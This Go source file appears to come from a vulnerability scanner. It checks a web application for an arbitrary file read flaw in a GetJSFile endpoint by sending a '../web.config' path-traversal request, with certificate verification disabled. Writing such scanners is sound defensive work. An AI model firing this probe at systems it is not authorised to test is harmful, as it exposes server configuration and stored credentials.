package vulList

import (
	"crypto/tls"
	"fmt"
	"github.com/fatih/color"
	"io/ioutil"
	"net/http"
	"strings"
)

func GetJSFileCheck(target string) error {

	client := &http.Client{
		Transport: &http.Transport{
			TLSClientConfig: &tls.Config{InsecureSkipVerify: true}, // 禁用证书验证
		},
	}
	baseurl := target + "Utility/GetJSFile?filePath=../web.config"
	resp, err := client.Get(baseurl)
	if err != nil {
		return fmt.Errorf("Error sending request: %v", err)
	}

	Body, err := ioutil.ReadAll(resp.Body)
	if err != nil {
		return fmt.Errorf("Error reading response body: %v", err)
	}

	defer resp.Body.Close()
	responseBody := string(Body)

	if strings.Contains(responseBody, `<?xml version="1.0" encoding="utf-8"?>`) {
		green := color.New(color.FgGreen)
		green.Println("[+]GetJSFile arbitrary file read vulnerability")
		fmt.Println()
	} else {
		fmt.Println("[-]GetJSFile arbitrary file read vulnerability")
		fmt.Println()
	}
	return nil
}
